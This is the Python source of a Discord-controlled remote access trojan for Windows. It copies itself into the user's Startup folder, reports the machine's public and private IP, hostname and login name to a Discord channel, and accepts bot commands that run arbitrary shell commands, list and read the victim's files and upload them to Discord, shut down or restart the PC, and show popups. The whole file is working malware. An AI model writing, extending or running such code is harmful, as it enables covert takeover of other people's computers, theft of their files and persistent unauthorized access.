import discord
from discord.ext import commands
import random
from discord import File
import socket
import aiohttp
import subprocess
import os
from pathlib import Path
import chardet
import shutil
import sys

# Create a bot instance and define the command prefix
bot = commands.Bot(command_prefix='$', intents=discord.Intents.all())
bot.remove_command("help")  # Remove the default help command
username = socket.gethostname()
private_ip = socket.gethostbyname(username)
pcname = os.getlogin()
# Define the usercode variable to store the generated user code
usercode = None

# Function to generate a random user code
def generate_usercode():
    return ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(20))

# Event handler when the bot is ready
@bot.event
async def on_ready():
    global usercode
    usercode = generate_usercode()

    # Get the public IP using an external service (e.g., httpbin.org)
    async with aiohttp.ClientSession() as session:
        async with session.get('https://httpbin.org/ip') as response:
            public_ip_data = await response.json()
            public_ip = public_ip_data['origin']

    # Get the private IP and username
    username = socket.gethostname()
    private_ip = socket.gethostbyname(username)
    pcname = os.getlogin()
    print(f'Logged in as {bot.user.name}')
    print(f'User code: {usercode}')
    print(f'Public IP: {public_ip}')
    print(f'Private IP: {private_ip}')

    # Send the user code, public IP, private IP, and username as an embed in the general channel
    general_channel = discord.utils.get(bot.get_all_channels(), name='general')
    if general_channel:
        embed = discord.Embed(
            title='New User Connected',
            description=f'User Code: `{usercode}`\nPublic IP: `{public_ip}`\nPrivate IP: `{private_ip}`\nDesktop Name: `{username}`\nUsername: {pcname}',
            color=discord.Color.green()
        )
        await general_channel.send(embed=embed)

    await bot.change_presence(activity=discord.Game(name="$bash <usercode> <bash_command>"))

# Command to run bash commands
@bot.command()
async def bash(ctx, user_code, *, bash_command):
    global usercode
    if user_code == usercode:
        try:
            # Run the bash command in the 'downloads' directory
            subprocess.run(
                bash_command, shell=True, cwd=str(os.path.join(Path.home(), "Downloads")), stderr=subprocess.STDOUT
            )
            await ctx.send('```Command has been executed.```')
        except subprocess.CalledProcessError as e:
            await ctx.send(f'```Error: {e.output}```')

@bot.command()
async def username(ctx, user_code):
    global usercode
    if user_code == usercode:
        await ctx.reply(pcname)

@bot.command()
async def desktopname(ctx, user_code):
    global usercode
    if user_code == usercode:
        await ctx.reply(username)

@bot.command()
async def privateip(ctx, user_code):
    global usercode
    if user_code == usercode:
        await ctx.reply(private_ip)

@bot.command()
async def publicip(ctx, user_code):
    global usercode
    if user_code == usercode:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://httpbin.org/ip') as response:
                public_ip_data = await response.json()
                public_ip = public_ip_data['origin']
        await ctx.reply(public_ip)

# Function to get the PC username
def get_pc_username():
    return os.getlogin()

# Function to replace {user} with the PC username in a directory path
def replace_user_placeholder(directory):
    pc_username = get_pc_username()
    return directory.replace("{user}", pc_username)

@bot.command()
async def listfiles(ctx, user_code, directory='.'):
    global usercode
    if user_code == usercode:
        try:
            # Use pathlib to handle the directory path
            base_path = Path.home() / directory

            # Check if the specified path exists
            if not base_path.is_dir():
                await ctx.send(f"Directory '{base_path}' does not exist.")
                return

            # List files in the specified directory
            file_list = [entry.name for entry in base_path.iterdir() if entry.is_file()]

            # Create a string with the file list
            files = '\n'.join(file_list)

            # Check if the file list is too large to send as a text message
            if len(files) > 2000:
                # Save the file list to a text file and send it
                file_path = base_path / "file_list.txt"
                with open(file_path, "w", encoding="utf-8") as file:
                    file.write(files)
                await ctx.send(f"File list is too large, sending as a file.", file=File(file_path))
                os.remove(file_path)
            else:
                await ctx.send(f'```\n{files}\n```')
        except Exception as e:
            await ctx.send(f'Error: {str(e)}')

@bot.command()
async def contents(ctx, user_code, directory='Downloads', filename=None):
    global usercode
    if user_code == usercode:
        try:
            # Use pathlib to handle the directory and file paths
            base_path = Path.home() / directory
            file_path = base_path / filename if filename else None

            # Check if the specified directory exists
            if not base_path.is_dir():
                await ctx.send(f"Directory '{base_path}' does not exist.")
                return

            # Check if the specified file exists
            if not file_path.is_file() and filename:
                await ctx.send(f"File '{filename}' does not exist in '{directory}'.")
                return

            # Read the file contents with automatic encoding detection
            if file_path:
                with open(file_path, "rb") as file:
                    encoding_info = chardet.detect(file.read())

                encoding = encoding_info['encoding']

                with open(file_path, "r", encoding=encoding, errors="ignore") as file:
                    file_contents = file.read()

                # Check if the file contents are too large to send as a message
                if len(file_contents) > 2000:
                    # Save the file contents to a text file and send it
                    temp_file_path = base_path / "temp_file.txt"
                    with open(temp_file_path, "w", encoding=encoding, errors="ignore") as temp_file:
                        temp_file.write(file_contents)
                    await ctx.send(f"File contents are too large, sending as a file.", file=File(temp_file_path))
                    os.remove(temp_file_path)
                else:
                    await ctx.send(f'```\n{file_contents}\n```')
            else:
                await ctx.send(f"Specify a filename in '{directory}' to retrieve its contents.")
        except Exception as e:
            await ctx.send(f'Error: {str(e)}')

# Command to shut down the PC
@bot.command()
async def shutdown(ctx, user_code):
    global usercode
    if user_code == usercode:
        try:
            # Execute the shutdown command
            subprocess.run('shutdown /s /f /t 0', shell=True)
            await ctx.send('Shutting down the PC...')
        except Exception as e:
            await ctx.send(f'Error: {str(e)}')

# Command to restart the PC
@bot.command()
async def restart(ctx, user_code):
    global usercode
    if user_code == usercode:
        try:
            # Execute the restart command
            subprocess.run('shutdown /r /f /t 0', shell=True)
            await ctx.send('Restarting the PC...')
        except Exception as e:
            await ctx.send(f'Error: {str(e)}')

# Command to log off the user
@bot.command()
async def logoff(ctx, user_code):
    global usercode
    if user_code == usercode:
        try:
            # Execute the logoff command
            subprocess.run('shutdown /l', shell=True)
            await ctx.send('Logging off...')
        except Exception as e:
            await ctx.send(f'Error: {str(e)}')

# Command to display a message box on the PC
@bot.command()
async def popup(ctx, user_code, *, message):
    global usercode
    if user_code == usercode:
        try:
            # Execute the command to display a message box
            subprocess.run(f'msg {get_pc_username()} "{message}"', shell=True)
            await ctx.send(f'Message displayed on the PC: "{message}"')
        except Exception as e:
            await ctx.send(f'Error: {str(e)}')

def copy_to_startup():
    """Copy the running script or executable to Windows `startup` folder."""
    dest_name = os.path.basename(sys.argv[0])  # Get the name of the running script or executable
    startup_path = os.path.join(
        os.getenv("APPDATA"),
        r"Microsoft/Windows/Start Menu/Programs/Startup",
    )
    dest_path = os.path.join(startup_path, dest_name)
    if not os.path.exists(dest_path):
        shutil.copyfile(sys.argv[0], dest_path)

copy_to_startup()
# Run the bot with your Discord bot token
bot.run('<token>')
